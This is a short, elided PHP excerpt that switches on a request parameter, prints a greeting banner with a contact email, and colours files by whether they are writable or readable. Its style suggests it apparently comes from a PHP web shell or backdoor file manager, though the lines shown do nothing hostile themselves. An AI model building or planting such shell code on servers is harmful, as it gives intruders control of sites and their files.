...
if(isset($_REQUEST['x']))
{
	...
	switch($_REQUEST['x'])
	{
		...
		case 'x': print '</br></br></br><center><h1 id="nm">hope you good day</h1><h3><a href="mailto:dhpriv8@gmail.com">come on</center>';break;
	}
}
else
{
...
function get_color($f){if(is_writable($f)) {$c='lime';}if(!is_writable($f) && is_readable($f)) {$c=''.$txtC.'';}if(!is_writable($f) && !is_readable($f)) {$c='crimson';}return($c);}
